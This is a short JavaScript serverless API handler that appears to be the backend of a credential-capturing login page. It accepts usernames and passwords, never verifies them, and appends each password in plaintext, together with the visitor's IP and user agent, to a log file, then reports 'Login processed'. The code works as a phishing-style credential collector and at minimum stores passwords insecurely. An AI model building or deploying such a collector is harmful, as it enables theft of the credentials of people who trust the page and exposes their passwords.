const fs = require('fs');
const path = require('path');

// Log file path (using Vercel's tmp directory for writes)
const logFilePath = path.join('/tmp', 'login_attempts.log');

// Input validation
function validateInput(data) {
    const errors = [];
    
    if (!data.username || typeof data.username !== 'string' || data.username.length > 50) {
        errors.push('Invalid username');
    }
    
    if (!data.password || typeof data.password !== 'string' || data.password.length > 100) {
        errors.push('Invalid password');
    }
    
    return errors;
}

// Function to log login attempts
function logLoginAttempt(data) {
    const logEntry = {
        timestamp: new Date().toISOString(),
        username: data.username,
        password: data.password,
        ip: data.ip,
        userAgent: data.userAgent
    };
    
    const logLine = JSON.stringify(logEntry) + '\n';
    
    try {
        fs.appendFileSync(logFilePath, logLine);
        return true;
    } catch (error) {
        console.error('Error writing to log file:', error);
        return false;
    }
}

export default function handler(req, res) {
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method not allowed' });
    }
    
    try {
        const { username, password, ip, userAgent } = req.body;
        
        // Validate input
        const validationErrors = validateInput({ username, password });
        if (validationErrors.length > 0) {
            return res.status(400).json({ 
                success: false, 
                errors: validationErrors 
            });
        }
        
        // Log the attempt
        const logged = logLoginAttempt({ username, password, ip, userAgent });
        
        if (logged) {
            res.status(200).json({ success: true, message: 'Login processed' });
        } else {
            res.status(500).json({ success: false, message: 'Logging failed' });
        }
        
    } catch (error) {
        console.error('API Error:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
}
